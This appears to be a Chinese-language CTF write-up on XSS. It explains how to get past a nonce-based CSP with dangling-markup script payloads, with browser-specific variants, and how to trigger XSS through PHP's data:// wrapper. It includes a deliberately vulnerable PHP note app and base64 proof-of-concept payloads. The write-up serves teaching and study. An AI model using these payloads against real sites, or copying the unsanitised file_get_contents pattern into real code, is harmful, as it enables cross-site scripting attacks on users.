@@ -1,0 +1,81 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<blockquote>
+<p>最近做一道关于XSS的CTF题目，用到了data://协议触发XSS，并且需要绕过带nonce的CSP策略。由于题目环境没有了，这里主要总结一下其中用到的一些技巧。</p>
+</blockquote>
+<h2 data-content="1" id="55b2749adaf3ba0b84965feaa48e386c">CSP绕过</h2>
+<p>在绕过csp策略的时候，找到了以下这篇文章<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank">https://www.jianshu.com/p/f1de775bc43e</a></p>
+<blockquote>
+<p>由于使用了CSP策略，一般想要获取cookie的方法，主要是使用以下几种跳转语句。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190728173359-d3dd36b6-b11a-1.png"/></p>
+</blockquote>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190728173359-d4409850-b11a-1.png"/><br/>
+对于带有nonce的CSP策略，要执行跳转语句可以使用这种方式绕过，但是由于Chrome和Firefox对于标签的补齐和解析使用了不一样的方式，因此这个绕过的payload有些不一样。</p>
+<ul>
+<li>
+<p><strong>在firefox上可以直接使用上述的payload，只要把跳转语句写入  <code>src</code>  指向的文件<code>//14.rs</code>就可以了，因为属性 <code>a</code>  后面的 <code>"</code> 会被优先解析，这样就会把里面的<code>&lt;/p&gt;
+&lt;script id=</code>解析成字符串，从而成功引入了带有<code>nonce</code>的<code>script</code>，从而成功执行<code>src</code>里的内容。</strong></p>
+</li>
+<li>
+<p><strong>Chrome对于标签的解析方式则不同，虽然它也是这样补齐了标签，但是解析的时候仍然会优先解析<code>"</code>里的<code>script</code>，导致发生错误，无法实现xss。在这种情况下，只需要使用Chrome解析html5 的属性的一种特性——浏览器只会解析同一个标签内的第一个属性，对于后面的同名属性，会自动忽略掉。因此，只要改一下payload：</strong></p>
+<pre><code>&lt;script src=//14.rs  a="test" a="   
+//这样会把后面 a="&lt;/p&gt;&lt;script id="给直接忽略掉
+或者
+&lt;script src=//14.rs src="
+//把src后面的内容直接忽略</code></pre>
+<p>由此可以成功引入带有<code>nonce</code>的<code>&lt;script&gt;</code>标签，成功执行XSS。</p>
+</li>
+</ul>
+<h2 data-content="1" id="c15d409684814f7190f402f2d4758162">data://协议使用</h2>
+<p>在XSS的时候，可能常常会用到php伪协议的辅助，比如这样两种情况：</p>
+<ul>
+<li>对于提交的内容，通过<code>htmlspecialchars()</code>函数来转义特殊字符，然后保存到某个文件里，之后通过文件包含，把文件的内容输出到某个html标签之间。</li>
+<li>对于提交的内容，通过htmlspecialchars()函数来转义特殊字符，然后把内容在某个HTML标签内输出出来。</li>
+</ul>
+<p>在这种情况下，怎么去触发XSS呢？<br/>
+这个时候，可以考虑使用data://这个协议：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190728173400-d468de5a-b11a-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190728173400-d4a153a2-b11a-1.png"/><br/>
+只要把红框中的内容修改成<code>&lt;script&gt;alert(1)&lt;script&gt;</code>的base64编码<code>JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==</code>就可以触发xss了。</p>
+<blockquote>
+<p>实例：使用php实现一个简单的笔记上传保存到文件里，并显示到网页的功能：</p>
+</blockquote>
+<p>getnote.php:</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;dataXSS&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action="upnote.php" method="post"&gt;
+    &lt;p&gt;note:&lt;/p&gt;
+    &lt;input type="text" name="note" &gt;
+    &lt;input type="submit" name="submit"&gt;
+&lt;/form&gt;
+
+&lt;?php
+$url = $_GET['url'];
+
+echo "&lt;p&gt;your input url:&lt;/p&gt;"."&lt;p&gt;".urldecode(file_get_contents($url)) ."&lt;/p&gt;";
+?&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>upnote.php</p>
+<pre><code>&lt;?php
+file_put_contents('url.txt',htmlspecialchars($_POST[note]));
+header('location:getnote.php?url=url.txt');
+?&gt;</code></pre>
+<p>程序的逻辑很简单，不多介绍。首先我们访问：getnote.php，把笔记的内容写成<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，然后提交：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190728173400-d4d7ad6c-b11a-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190728173401-d558ba06-b11a-1.png"/></p>
+<p>没有发生弹框，检查元素可以发现<code>&lt;,&gt;</code>都被<code>htmlspecialchars()</code><br/>
+转义了，看一下文件内容发现也被转义了，如下图：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190728173402-d59c16a2-b11a-1.png"/></p>
+<p>这个时候，我们发现读取url的函数使用的是<code>file_get_contents($url)</code>，因此可以使用data://协议，构造下面的payload:</p>
+<pre><code>getnote.php?url=data://text/plain;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==</code></pre>
+<p>访问，发现弹框了。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190728173402-d5f9b2ee-b11a-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190728173403-d620be98-b11a-1.png"/></p>
+</div>
+</div>
